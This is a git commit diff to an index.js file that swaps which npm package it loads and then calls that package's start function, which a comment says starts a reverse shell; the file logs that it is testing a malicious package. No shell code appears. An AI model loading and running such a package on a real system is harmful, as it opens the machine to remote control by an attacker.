0e0b295ae4914405e98ddb88079ac27553cf7bc9
balamutas <79403623+balamutas@users.noreply.github.com>
2024-10-11 15:44:26 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 // index.js
-const shell = require('awsome-package-erikas');
+const shell = require('awsome-package-erikas2');
 
 console.log("Testing malicious package...");
 shell.start(); // Call the function that starts the reverse shell (if applicable)
